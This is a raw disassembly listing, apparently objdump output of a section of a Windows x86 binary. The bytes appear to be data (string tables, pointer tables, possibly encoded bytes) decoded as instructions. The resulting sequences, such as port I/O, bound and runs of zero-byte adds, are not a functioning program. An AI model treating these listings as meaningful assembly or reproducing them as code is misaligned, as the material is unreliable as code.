  427ff7:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427ffd:	lea    edx,[eax+0x75]
  428000:	xor    eax,0x35758021
  428005:	out    dx,al
  428006:	xor    BYTE PTR [ecx],0x35
  428009:	out    dx,al
  42800a:	or     ch,0x82
  42800d:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  428013:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  428019:	xor    dl,bh
  42801b:	and    ah,BYTE PTR [edi+ebp*2]
  42801e:	cmp    BYTE PTR [ebx-0x4],dl
  428021:	in     eax,dx
  428022:	add    eax,0xc86b20d
  428027:	mov    dl,0xba
  428029:	sub    edi,edi
  42802b:	std    
  42802c:	push   eax
  42802d:	xor    DWORD PTR ds:0x35757c21,esi
  428033:	out    dx,eax
  428034:	lea    ecx,[ebp+0x75808d8d]
  42803a:	xor    eax,0xd56a4f35
  42803f:	ret    
  428040:	xor    BYTE PTR [ebp+0x35],0x71
  428044:	in     eax,dx
  428045:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  42804b:	push   ebx
  42804c:	jge    0x4280cb
  42804e:	aad    0x23
  428050:	jge    0x428029
  428052:	fmul   DWORD PTR [ebp-0x2b]
  428055:	xor    eax,0x35d54d2d
  42805a:	sub    eax,0x2d35d54d
  42805f:	dec    ebp
  428060:	aad    0x35
  428062:	sub    eax,0x55357580
  428067:	dec    ebp
  428068:	test   esp,0x35d54d39
  42806e:	and    eax,0x2535d54d
  428073:	dec    ebp
  428074:	aad    0x35
  428076:	and    eax,0x81357580
  42807b:	dec    ebp
  42807c:	test   esp,0x35d54d90
  428082:	adc    eax,0x3d357580
  428087:	dec    ebp
  428088:	test   esp,0x3575806f
  42808e:	xor    eax,0x7550f74d
  428093:	xor    eax,0x357580ef
  428098:	and    DWORD PTR [edi+0x6a],ecx
  42809b:	aad    0xa1
  42809d:	xor    BYTE PTR [ebp+0x35],0xee
  4280a1:	jl     0x428070
  4280a3:	test   BYTE PTR [edx],bh
  4280a5:	lea    ecx,[ebp+0x386f24f5]
  4280ab:	xor    BYTE PTR [ebp+0x35],0xef
  4280af:	xor    BYTE PTR [ecx],0x35
  4280b2:	out    dx,al
  4280b3:	adc    BYTE PTR [eax-0x7d],0x3a
  4280b7:	lea    ecx,[ebp+0x757c3a50]
  4280bd:	xor    eax,0x6f24f6ef
  4280c2:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  4280c8:	xor    DWORD PTR ds:0xedfc53ef,esi
  4280ce:	add    eax,0x29bab20d
  4280d3:	mov    dl,0x86
  4280d5:	or     al,0xff
  4280d7:	mov    dl,0x80
  4280d9:	xor    DWORD PTR ds:0xd7b26321,esi
  4280df:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  4280e5:	xor    DWORD PTR ds:0x835080ee,esi
  4280eb:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  4280f1:	int    0x32
  4280f3:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  4280f9:	les    ebx,FWORD PTR [edi]
  4280fb:	add    DWORD PTR [edi-0x12],esi
  4280fe:	push   eax
  4280ff:	jne    0x428136
  428101:	and    DWORD PTR [eax-0x7fdeca8b],eax
  428107:	xor    DWORD PTR ds:0xe55080ee,esi
  42810d:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  428113:	out    dx,eax
  428114:	xor    BYTE PTR [ebp+0x35],0xee
  428118:	or     ch,0x87
  42811b:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  428121:	xor    DWORD PTR ds:0x865080ee,esi
  428127:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  42812d:	out    dx,al
  42812e:	mov    ds:0xee353180,al
  428133:	adc    BYTE PTR [eax-0x1b],0x3a
  428137:	lea    ecx,[ebp+0x30808d80]
  42813d:	cmp    ch,bh
  42813f:	test   eax,0xfba7b880
  428144:	sub    eax,0x614c748d
  428149:	imul   edi,DWORD PTR [ecx+0x62],0x69
  42814d:	popa   
  42814e:	push   0x6c656548
  428153:	ins    BYTE PTR es:[edi],dx
  428154:	outs   dx,DWORD PTR ds:[esi]
  428155:	ja     0x428157
  428157:	popa   
  428158:	ins    DWORD PTR es:[edi],dx
  428159:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428160:	push   ebp
  428161:	outs   dx,BYTE PTR ds:[esi]
  428162:	bound  esp,QWORD PTR [ebp+0x0]
  428165:	push   0x6572576d
  42816a:	outs   dx,BYTE PTR ds:[esi]
  42816b:	jne    0x4281d1
  42816d:	outs   dx,DWORD PTR ds:[esi]
  42816e:	popa   
  42816f:	push   0x6b637573
  428174:	add    BYTE PTR [ebp+0x6f],cl
  428177:	ins    DWORD PTR es:[edi],dx
  428178:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42817f:	jo     0x4281e6
  428181:	je     0x428183
  428183:	dec    edx
  428184:	gs jae 0x4281fa
  428187:	ins    BYTE PTR es:[edi],dx
  428188:	outs   dx,DWORD PTR ds:[esi]
  428189:	dec    edi
  42818a:	js     0x4281f1
  42818c:	outs   dx,BYTE PTR ds:[esi]
  42818d:	outs   dx,DWORD PTR ds:[esi]
  42818e:	jb     0x4281f1
  428190:	add    BYTE PTR [edi+0x6f],al
  428193:	ja     0x4281f9
  428195:	dec    ebp
  428196:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42819d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  4281a5:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  4281ac:	jae    0x42821b
  4281ae:	popa   
  4281af:	fs jns 0x428221
  4281b2:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  4281b6:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  4281bd:	bound  esi,QWORD PTR [ebp+0x6d]
  4281c0:	add    BYTE PTR [ebp+0x72],al
  4281c3:	outs   dx,DWORD PTR ds:[si]
  4281c5:	jo     0x428228
  4281c7:	jns    0x42822f
  4281c9:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  4281d0:	jne    0x42823f
  4281d2:	popa   
  4281d3:	gs fs jo 0x42823c
  4281d7:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  4281de:	dec    esp
  4281df:	outs   dx,DWORD PTR ds:[esi]
  4281e0:	jne    0x428246
  4281e2:	push   0x6d6d7069
  4281e7:	add    BYTE PTR [edi+0x6c],al
  4281ea:	outs   dx,DWORD PTR ds:[esi]
  4281eb:	jo     0x428240
  4281ed:	ja     0x42825e
  4281ef:	bound  eax,QWORD PTR [eax]
  4281f1:	jns    0x428262
  4281f3:	pop    ecx
  4281f4:	gs ins BYTE PTR es:[edi],dx
  4281f6:	jo     0x428251
  4281f8:	jne    0x428266
  4281fa:	gs gs jae 0x42825f
  4281fe:	popa   
  4281ff:	add    BYTE PTR [ecx+0x77],ah
  428202:	popa   
  428203:	inc    esi
  428204:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  42820b:	outs   dx,BYTE PTR ds:[esi]
  42820c:	je     0x42827d
  42820e:	add    BYTE PTR [ebp+0x73],ah
  428211:	dec    esp
  428212:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  428219:	ins    BYTE PTR es:[edi],dx
  42821a:	outs   dx,DWORD PTR ds:[esi]
  42821b:	bound  esp,QWORD PTR [ebp+0x0]
  42821e:	push   0x617a6761
  428223:	bound  ebp,QWORD PTR [edi+0x75]
  428226:	jo     0x428228
  428228:	inc    edx
  428229:	outs   dx,DWORD PTR ds:[esi]
  42822a:	jb     0x4282a0
  42822c:	popa   
  42822d:	js     0x42829e
  42822f:	data16 jo 0x428297
  428232:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  42823a:	fs gs popa 
  42823d:	outs   dx,DWORD PTR fs:[esi]
  42823f:	jae    0x4282b9
  428241:	jne    0x428243
  428243:	inc    edi
  428244:	add    BYTE PTR [edi+0x0],ch
  428247:	add    BYTE PTR gs:[ebx+0x0],dh
  42824b:	dec    edx
  42824c:	add    BYTE PTR [ecx+0x0],ah
  42824f:	jbe    0x428251
  428251:	popa   
  428252:	add    BYTE PTR [eax],al
  428254:	add    BYTE PTR [edx+0x0],al
  428257:	popa   
  428258:	add    BYTE PTR [edx+0x0],ah
  42825b:	jne    0x42825d
  42825d:	outs   dx,DWORD PTR ds:[esi]
  42825e:	add    BYTE PTR [ebp+0x0],ch
  428261:	push   0x6d00
  428266:	add    BYTE PTR [edx+0x0],dh
  428269:	popa   
  42826a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42826e:	add    BYTE PTR [ecx+0x0],ah
  428271:	ins    DWORD PTR es:[edi],dx
  428272:	add    BYTE PTR [edi+0x0],ah
  428275:	popa   
  428276:	add    BYTE PTR [ecx+0x0],bh
  428279:	js     0x42827b
  42827b:	imul   eax,DWORD PTR [eax],0x610000
  428281:	ins    DWORD PTR es:[edi],dx
  428282:	add    BYTE PTR [ecx+0x0],ah
  428285:	ins    BYTE PTR es:[edi],dx
  428286:	add    BYTE PTR [edx+0x0],ah
  428289:	outs   dx,DWORD PTR ds:[esi]
  42828a:	add    BYTE PTR [edi+0x0],ch
  42828d:	popa   
  42828e:	add    BYTE PTR [eax+0x0],dh
  428291:	jo     0x428293
  428293:	add    BYTE PTR [eax],al
  428295:	popa   
  428296:	add    BYTE PTR [esi+0x0],dh
  428299:	popa   
  42829a:	add    BYTE PTR [edi+0x0],ah
  42829d:	outs   dx,DWORD PTR ds:[esi]
  42829e:	add    BYTE PTR [ebx+0x0],dh
  4282a1:	push   0x77006f00
  4282a6:	add    BYTE PTR [eax+eax*1+0x65],ch
  4282aa:	add    BYTE PTR [ebp+0x0],dh
  4282ad:	add    BYTE PTR fs:[ebp+0x0],ah
  4282b1:	add    BYTE PTR fs:[eax],al
  4282b4:	add    BYTE PTR [eax+0x0],cl
  4282b7:	popa   
  4282b8:	add    BYTE PTR [edx+0x0],dh
  4282bb:	add    BYTE PTR gs:[edx+0x0],al
  4282bf:	imul   eax,DWORD PTR [eax],0x6b0072
  4282c5:	arpl   WORD PTR [eax],ax
  4282c7:	popa   
  4282c8:	add    BYTE PTR [ebp+0x0],ch
  4282cb:	add    BYTE PTR [eax],al
  4282cd:	imul   eax,DWORD PTR [eax],0x61
  4282d0:	add    BYTE PTR [edi+0x0],dh
  4282d3:	popa   
  4282d4:	add    BYTE PTR [eax+0x0],bh
  4282d7:	outs   dx,DWORD PTR ds:[esi]
  4282d8:	add    BYTE PTR [edi+0x0],ch
  4282db:	je     0x4282dd
  4282dd:	add    BYTE PTR [eax],al
  4282df:	jb     0x4282e1
  4282e1:	jne    0x4282e3
  4282e3:	add    BYTE PTR gs:[ecx+0x0],ah
  4282e7:	ins    BYTE PTR es:[edi],dx
  4282e8:	add    BYTE PTR [eax+eax*1+0x68],ch
  4282ec:	add    BYTE PTR [ebp+0x0],ch
  4282ef:	ins    DWORD PTR es:[edi],dx
  4282f0:	add    BYTE PTR [eax],al
  4282f2:	add    BYTE PTR [edi+0x0],ch
  4282f5:	add    BYTE PTR gs:[eax+0x0],bh
  4282f9:	imul   eax,DWORD PTR [eax],0x650072
  4282ff:	ja     0x428301
  428301:	outs   dx,DWORD PTR ds:[esi]
  428302:	add    BYTE PTR [ebp+0x0],ah
  428305:	popa   
  428306:	add    BYTE PTR [edx+0x0],ah
  428309:	ins    BYTE PTR es:[edi],dx
  42830a:	add    BYTE PTR [ecx+0x0],ch
  42830d:	add    BYTE PTR [eax],al
  42830f:	jne    0x428311
  428311:	ins    DWORD PTR es:[edi],dx
  428312:	add    BYTE PTR [esi+0x0],ch
  428315:	outs   dx,DWORD PTR ds:[esi]
  428316:	add    BYTE PTR [edi+0x0],ah
  428319:	bound  eax,QWORD PTR [eax]
  42831b:	popa   
  42831c:	add    BYTE PTR [esi+0x0],dh
  42831f:	outs   dx,DWORD PTR ds:[esi]
  428320:	add    BYTE PTR [edi+0x0],dh
  428323:	bound  eax,QWORD PTR [eax]
  428325:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  42832a:	add    BYTE PTR [eax],al
  42832c:	add    bh,dh
  42832e:	sub    al,0x10
  428330:	add    BYTE PTR [esi],bl
  428332:	aaa    
  428333:	adc    BYTE PTR [eax],al
  428335:	and    al,0x42
  428337:	adc    BYTE PTR [eax],al
  428339:	rol    BYTE PTR [eax+edx*1],cl
  42833c:	add    ch,dh
  42833e:	xor    BYTE PTR [eax],dl
  428340:	add    BYTE PTR [esi-0x1affefcf],dh
  428346:	cmp    dl,BYTE PTR [eax]
  428348:	add    BYTE PTR [ebx],dh
  42834a:	ins    BYTE PTR es:[edi],dx
  42834b:	adc    BYTE PTR [eax],al
  42834d:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428351:	push   ecx
  428352:	inc    ecx
  428353:	adc    BYTE PTR [eax],al
  428355:	mov    cl,0x60
  428357:	adc    BYTE PTR [eax],al
  428359:	aas    
  42835a:	or     al,0x10
  42835c:	add    al,bh
  42835e:	and    DWORD PTR [eax],edx
  428360:	add    BYTE PTR [edx+0x37],dl
  428363:	adc    BYTE PTR [eax],al
  428365:	test   eax,0xa3001054
  42836a:	add    DWORD PTR [eax],edx
  42836c:	add    BYTE PTR [edi],ah
  42836e:	push   esp
  42836f:	adc    BYTE PTR [eax],al
  428371:	cmc    
  428372:	push   esi
  428373:	adc    BYTE PTR [eax],al
  428375:	imul   ecx,DWORD PTR [ebx],0x10
  428378:	add    BYTE PTR ds:0x31004283,ch
  42837e:	add    DWORD PTR [edx+0x0],0x35
  428382:	add    DWORD PTR [edx+0x0],0x39
  428386:	add    DWORD PTR [edx+0x0],0x3d
  42838a:	add    DWORD PTR [edx+0x0],0x41
  42838e:	add    DWORD PTR [edx+0x0],0x45
  428392:	add    DWORD PTR [edx+0x0],0x49
  428396:	add    DWORD PTR [edx+0x0],0x4d
  42839a:	add    DWORD PTR [edx+0x0],0x51
  42839e:	add    DWORD PTR [edx+0x0],0x55
  4283a2:	add    DWORD PTR [edx+0x0],0x59
  4283a6:	add    DWORD PTR [edx+0x0],0x5d
  4283aa:	add    DWORD PTR [edx+0x0],0x61
  4283ae:	add    DWORD PTR [edx+0x0],0x65
  4283b2:	add    DWORD PTR [edx+0x0],0x69
  4283b6:	add    DWORD PTR [edx+0x0],0x6d
  4283ba:	add    DWORD PTR [edx+0x0],0x71
  4283be:	add    DWORD PTR [edx+0x0],0x75
  4283c2:	add    DWORD PTR [edx+0x0],0x5
  4283c6:	test   BYTE PTR [edx+0x0],al
  4283c9:	or     DWORD PTR [edx+eax*2+0x42840d00],eax
  4283d0:	add    BYTE PTR [ecx],dl
  4283d2:	test   BYTE PTR [edx+0x0],al
  4283d5:	adc    eax,0x19004284
  4283da:	test   BYTE PTR [edx+0x0],al
  4283dd:	sbb    eax,0x21004284
  4283e2:	test   BYTE PTR [edx+0x0],al
  4283e5:	and    eax,0x29004284
  4283ea:	test   BYTE PTR [edx+0x0],al
  4283ed:	sub    eax,0x31004284
  4283f2:	test   BYTE PTR [edx+0x0],al
  4283f5:	xor    eax,0x39004284
  4283fa:	test   BYTE PTR [edx+0x0],al
  4283fd:	cmp    eax,0x41004284
  428402:	test   BYTE PTR [edx+0x0],al
  428405:	arpl   WORD PTR [eax],si
  428407:	adc    BYTE PTR [eax],al
  428409:	push   ecx
  42840a:	xor    DWORD PTR [eax],edx
  42840c:	add    BYTE PTR [edi+ebx*2+0x10],ch
  428410:	add    BYTE PTR [ebx-0x5ffefc3],bl
  428416:	aaa    
  428417:	adc    BYTE PTR [eax],al
  428419:	(bad)  
  42841a:	pop    esi
  42841b:	adc    BYTE PTR [eax],al
  42841d:	call   0x1040:0xa400106a
  428424:	add    BYTE PTR [esi+0x23],ah
  428427:	adc    BYTE PTR [eax],al
  428429:	xor    DWORD PTR [eax],ebx
  42842b:	adc    BYTE PTR [eax],al
  42842d:	mov    edi,DWORD PTR [edi]
  42842f:	adc    BYTE PTR [eax],al
  428431:	and    BYTE PTR [ecx+0x10],0x0
  428435:	clc    
  428436:	ja     0x428448
  428438:	add    BYTE PTR [eax],dh
  42843a:	xor    dl,BYTE PTR [eax]
  42843c:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  428443:	adc    BYTE PTR [eax],al
  428445:	mov    fs,WORD PTR [ebx+0x10]
  428448:	add    BYTE PTR [ecx+0x6200107e],bl
  42844e:	daa    
  42844f:	adc    BYTE PTR [eax],al
  428451:	mov    edi,0x2e001069
  428456:	sub    eax,0x413c0010
  42845b:	adc    BYTE PTR [eax],al
  42845d:	xor    BYTE PTR [eax],dh
  42845f:	adc    BYTE PTR [eax],al
  428461:	outs   dx,BYTE PTR ds:[esi]
  428462:	dec    edi
  428463:	adc    BYTE PTR [eax],al
  428465:	adc    eax,0xeb001025
  42846a:	bound  edx,QWORD PTR [eax]
  42846c:	add    BYTE PTR [edi],dh
  42846e:	and    dl,BYTE PTR [eax]
  428470:	add    BYTE PTR [ebx+0x1a],bl
  428473:	adc    BYTE PTR [eax],al
  428475:	mov    BYTE PTR [esi+0x10],ch
  428478:	add    BYTE PTR [esi],ah
  42847a:	pusha  
  42847b:	adc    BYTE PTR [eax],al
  42847d:	pop    es
  42847e:	adc    eax,0x1ca50010
  428483:	adc    BYTE PTR [eax],al
  428485:	inc    ebp
  428486:	test   BYTE PTR [edx+0x0],al
  428489:	dec    ecx
  42848a:	test   BYTE PTR [edx+0x0],al
  42848d:	dec    ebp
  42848e:	test   BYTE PTR [edx+0x0],al
  428491:	push   ecx
  428492:	test   BYTE PTR [edx+0x0],al
  428495:	push   ebp
  428496:	test   BYTE PTR [edx+0x0],al
  428499:	pop    ecx
  42849a:	test   BYTE PTR [edx+0x0],al
  42849d:	pop    ebp
  42849e:	test   BYTE PTR [edx+0x0],al
  4284a1:	popa   
  4284a2:	test   BYTE PTR [edx+0x0],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp-0x7c],dh
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x5affbd7c],al
  4284c6:	das    
  4284c7:	adc    BYTE PTR [eax],al
  4284c9:	add    bh,BYTE PTR [esi+0x10]
  4284cc:	add    BYTE PTR [ebx],ch
  4284ce:	adc    al,0x10
  4284d0:	add    BYTE PTR ds:0x4b001060,ah
  4284d6:	pop    edx
  4284d7:	adc    BYTE PTR [eax],al
  4284d9:	dec    ecx
  4284da:	jne    0x4284ec
  4284dc:	add    dh,ch
  4284de:	pop    esp
  4284df:	adc    BYTE PTR [eax],al
  4284e1:	push   edx
  4284e2:	cmp    eax,0x529b0010
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	pop    ss
  4284ea:	cmp    dl,BYTE PTR [eax]
  4284ec:	add    BYTE PTR [ebp-0x64ffef93],cl
  4284f2:	xor    eax,0x158d0010
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	adc    DWORD PTR [edi+0x10],ebp
  4284fc:	add    BYTE PTR [ecx+0x51],ch
  4284ff:	adc    BYTE PTR [eax],al
  428501:	jmp    0x42850f
  428503:	adc    BYTE PTR [eax],al
  428505:	lds    eax,FWORD PTR [edx+eax*2+0x4284c900]
  42850c:	add    ch,cl
  42850e:	test   BYTE PTR [edx+0x0],al
  428511:	rol    DWORD PTR [edx+eax*2+0x4284d500],1
  428518:	add    cl,bl
  42851a:	test   BYTE PTR [edx+0x0],al
  42851d:	fld    QWORD PTR [edx+eax*2+0x4284e100]
  428524:	add    ch,ah
  428526:	test   BYTE PTR [edx+0x0],al
  428529:	jmp    0xed42c7b2
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp+0x45d70042],eax
  428547:	adc    BYTE PTR [eax],al
  428549:	xlat   BYTE PTR ds:[ebx]
  42854a:	pusha  
  42854b:	adc    BYTE PTR [eax],al
  42854d:	lea    ebp,[eax+edx*1+0x0]
  428551:	hlt    
  428552:	add    BYTE PTR [eax],dl
  428554:	add    BYTE PTR [esp+esi*2],dl
  428557:	adc    BYTE PTR [eax],al
  428559:	out    0x44,al
  42855b:	adc    BYTE PTR [eax],al
  42855d:	dec    esi
  42855e:	bound  edx,QWORD PTR [eax]
  428560:	add    BYTE PTR [edi+ebp*2],ch
  428563:	adc    BYTE PTR [eax],al
  428565:	cmp    ebx,DWORD PTR [ebx]
  428567:	adc    BYTE PTR [eax],al
  428569:	inc    ebp
  42856a:	pop    ecx
  42856b:	adc    BYTE PTR [eax],al
  42856d:	imul   BYTE PTR [ecx+0x10]
  428570:	add    BYTE PTR [esi],ah
  428572:	arpl   WORD PTR [eax],dx
  428574:	add    BYTE PTR [ebp-0x4fffefee],bh
  42857a:	sbb    edx,DWORD PTR [eax]
  42857c:	add    BYTE PTR [ebx],ah
  42857e:	adc    BYTE PTR ds:[eax],al
  428581:	xchg   ebx,eax
  428582:	push   ecx
  428583:	adc    BYTE PTR [eax],al
  428585:	inc    ebp
  428586:	test   DWORD PTR [edx+0x0],eax
  428589:	dec    ecx
  42858a:	test   DWORD PTR [edx+0x0],eax
  42858d:	dec    ebp
  42858e:	test   DWORD PTR [edx+0x0],eax
  428591:	push   ecx
  428592:	test   DWORD PTR [edx+0x0],eax
  428595:	push   ebp
  428596:	test   DWORD PTR [edx+0x0],eax
  428599:	pop    ecx
  42859a:	test   DWORD PTR [edx+0x0],eax
  42859d:	pop    ebp
  42859e:	test   DWORD PTR [edx+0x0],eax
  4285a1:	popa   
  4285a2:	test   DWORD PTR [edx+0x0],eax
  4285a5:	test   DWORD PTR gs:[edx+0x0],eax
  4285a9:	imul   eax,DWORD PTR [ebp-0x7a92ffbe],0x85710042
  4285b3:	inc    edx
  4285b4:	add    BYTE PTR [ebp-0x7b],dh
  4285b7:	inc    edx
  4285b8:	add    BYTE PTR [ecx-0x7b],bh
  4285bb:	inc    edx
  4285bc:	add    BYTE PTR [ebp-0x7b],bh
  4285bf:	inc    edx
  4285c0:	add    BYTE PTR [ecx+0x4285],al
	...
  4285d2:	add    BYTE PTR [eax],al
  4285d4:	sub    ch,dl
  4285d6:	mov    dh,0x4f
  4285d8:	add    BYTE PTR [eax],al
  4285da:	add    BYTE PTR [eax],al
  4285dc:	inc    eax
  4285dd:	xchg   esi,eax
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	add    DWORD PTR [eax],eax
  4285e2:	add    BYTE PTR [eax],al
  4285e4:	add    DWORD PTR [eax],eax
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	add    DWORD PTR [eax],eax
  4285ea:	add    BYTE PTR [eax],al
  4285ec:	adc    BYTE PTR [esi-0x69cffffe],dl
  4285f2:	add    al,BYTE PTR [eax]
  4285f4:	and    BYTE PTR [esi+0x2],dl
  4285fa:	add    BYTE PTR [eax],al
  4285fc:	add    BYTE PTR [eax],al
  4285fe:	add    BYTE PTR [eax],al
  428600:	adc    BYTE PTR [ecx+0x2],cl
  428606:	add    BYTE PTR [eax],al
  428608:	mov    DWORD PTR cs:[edx],eax
  42860b:	add    BYTE PTR [edx-0x77],al
  42860e:	add    al,BYTE PTR [eax]
  428610:	pop    eax
  428611:	mov    DWORD PTR [edx],eax
  428613:	add    BYTE PTR [eax-0x77],ch
  428616:	add    al,BYTE PTR [eax]
  428618:	jbe    0x4285a3
  42861a:	add    al,BYTE PTR [eax]
  42861c:	mov    cs,WORD PTR [ecx-0x7665fffe]
  428622:	add    al,BYTE PTR [eax]
  428624:	mov    al,0x89
  428626:	add    al,BYTE PTR [eax]
  428628:	mov    esp,0xce000289
  42862d:	mov    DWORD PTR [edx],eax
  42862f:	add    dl,bl
  428631:	mov    DWORD PTR [edx],eax
  428633:	add    dl,ch
  428635:	mov    DWORD PTR [edx],eax
  428637:	add    dl,bh
  428639:	mov    DWORD PTR [edx],eax
  42863b:	add    BYTE PTR [esi],al
  42863d:	mov    al,BYTE PTR [edx]
  42863f:	add    BYTE PTR [edx+ecx*4],dl
  428642:	add    al,BYTE PTR [eax]
  428644:	and    BYTE PTR [edx-0x75d3fffe],cl
  42864a:	add    al,BYTE PTR [eax]
  42864c:	mov    al,BYTE PTR ss:[edx]
  42864f:	add    BYTE PTR [edx-0x76],cl
  428652:	add    al,BYTE PTR [eax]
  428654:	pop    esp
  428655:	mov    al,BYTE PTR [edx]
  428657:	add    BYTE PTR [esi-0x76],ah
  42865a:	add    al,BYTE PTR [eax]
  42865c:	jo     0x4285e8
  42865e:	add    al,BYTE PTR [eax]
  428660:	or     BYTE PTR [edx-0x756ffffe],0x2
  428667:	add    BYTE PTR [edx-0x4dfffd76],ah
  42866d:	mov    al,BYTE PTR [edx]
  42866f:	add    al,al
  428671:	mov    al,BYTE PTR [edx]
  428673:	add    ah,cl
  428675:	mov    al,BYTE PTR [edx]
  428677:	add    dl,bl
  428679:	mov    al,BYTE PTR [edx]
  42867b:	add    dl,ch
  42867d:	mov    al,BYTE PTR [edx]
  42867f:	add    dl,bh
  428681:	mov    al,BYTE PTR [edx]
  428683:	add    BYTE PTR [eax],cl
  428685:	mov    eax,DWORD PTR [edx]
  428687:	add    BYTE PTR [eax],ah
  428689:	mov    eax,DWORD PTR [edx]
  42868b:	add    BYTE PTR [edx],ch
  42868d:	mov    eax,DWORD PTR [edx]
  42868f:	add    BYTE PTR [edx],bh
  428691:	mov    eax,DWORD PTR [edx]
  428693:	add    BYTE PTR [edx-0x75],dl
  428696:	add    al,BYTE PTR [eax]
  428698:	mov    eax,DWORD PTR fs:[edx]
  42869b:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  42869f:	add    BYTE PTR [ebx+ecx*4-0x7471fffe],al
  4286a6:	add    al,BYTE PTR [eax]
  4286a8:	pushf  
  4286a9:	mov    eax,DWORD PTR [edx]
  4286ab:	add    BYTE PTR [ebx+ecx*4-0x7447fffe],ch
  4286b2:	add    al,BYTE PTR [eax]
	...
  4286bc:	loop   0x428649
  4286be:	add    al,BYTE PTR [eax]
  4286c0:	lock mov eax,DWORD PTR [edx]
  4286c3:	add    BYTE PTR [esp+ecx*4],al
  4286c6:	add    al,BYTE PTR [eax]
  4286c8:	adc    cl,BYTE PTR [edx+eax*1+0x28c2800]
  4286cf:	add    BYTE PTR [edx],dh
  4286d1:	mov    WORD PTR [edx],es
  4286d3:	add    BYTE PTR [esi],bh
  4286d5:	mov    WORD PTR [edx],es
  4286d7:	add    BYTE PTR [esi-0x74],cl
  4286da:	add    al,BYTE PTR [eax]
  4286dc:	pusha  
  4286dd:	mov    WORD PTR [edx],es
  4286df:	add    BYTE PTR [esi-0x74],bh
  4286e2:	add    al,BYTE PTR [eax]
  4286e4:	nop
  4286e5:	mov    WORD PTR [edx],es
  4286e7:	add    BYTE PTR [esi-0x53fffd74],bl
  4286ed:	mov    WORD PTR [edx],es
  4286ef:	add    al,al
  4286f1:	mov    WORD PTR [edx],es
  4286f3:	add    ah,dl
  4286f5:	mov    WORD PTR [edx],es
  4286f7:	add    ah,ah
  4286f9:	mov    WORD PTR [edx],es
  4286fb:	add    dl,dh
  4286fd:	mov    WORD PTR [edx],es
  4286ff:	add    BYTE PTR [eax],al
  428701:	lea    eax,[edx]
  428703:	add    BYTE PTR [edx],dl
  428705:	lea    eax,[edx]
  428707:	add    BYTE PTR [ecx*4-0x72cbfffe],ah
  42870e:	add    al,BYTE PTR [eax]
  428710:	inc    esi
  428711:	lea    eax,[edx]
  428713:	add    BYTE PTR [edx-0x73],dl
  428716:	add    al,BYTE PTR [eax]
  428718:	lea    ax,[edx]
  42871b:	add    BYTE PTR [edx-0x73],bh
  42871e:	add    al,BYTE PTR [eax]
  428720:	mov    cl,BYTE PTR [ebp-0x7269fffe]
  428726:	add    al,BYTE PTR [eax]
  428728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428729:	lea    eax,[edx]
  42872b:	add    BYTE PTR [edx-0x3dfffd73],dh
  428731:	lea    eax,[edx]
  428733:	add    al,bl
  428735:	lea    eax,[edx]
  428737:	add    ah,ah
  428739:	lea    eax,[edx]
  42873b:	add    al,dh
  42873d:	lea    eax,[edx]
  42873f:	add    ah,bh
  428741:	lea    eax,[edx]
  428743:	add    BYTE PTR [edx],dl
  428745:	mov    es,WORD PTR [edx]
  428747:	add    BYTE PTR [esi+ecx*4],ah
  42874a:	add    al,BYTE PTR [eax]
  42874c:	xor    al,0x8e
  42874e:	add    al,BYTE PTR [eax]
  428750:	inc    edx
  428751:	mov    es,WORD PTR [edx]
  428753:	add    BYTE PTR [esi-0x72],dl
  428756:	add    al,BYTE PTR [eax]
  428758:	mov    es,WORD PTR fs:[edx]
  42875b:	add    BYTE PTR [eax-0x72],bh
  42875e:	add    al,BYTE PTR [eax]
  428760:	mov    cl,BYTE PTR [esi-0x7167fffe]
  428766:	add    al,BYTE PTR [eax]
  428768:	mov    ah,0x8e
  42876a:	add    al,BYTE PTR [eax]
  42876c:	(bad)  
  42876d:	mov    es,WORD PTR [edx]
  42876f:	add    dh,dl
  428771:	mov    es,WORD PTR [edx]
  428773:	add    al,dh
  428775:	mov    es,WORD PTR [edx]
  428777:	add    BYTE PTR [esi],al
  428779:	pop    DWORD PTR [edx]
  42877b:	add    BYTE PTR [edi+ecx*4],dl
  42877e:	add    al,BYTE PTR [eax]
